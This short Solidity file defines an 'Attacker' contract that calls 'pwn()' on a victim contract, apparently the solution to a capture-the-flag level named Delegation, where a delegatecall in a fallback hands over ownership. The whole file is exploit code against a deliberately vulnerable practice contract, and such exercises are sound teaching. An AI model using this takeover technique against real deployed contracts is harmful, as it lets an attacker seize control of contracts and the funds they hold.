// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Delegation } from "./Delegation.sol";

contract Attacker {

    address victim;

    constructor(address _addr) {
        victim = _addr;
    }

    function attack() public {
        victim.call(abi.encodeWithSignature("pwn()"));
    }
}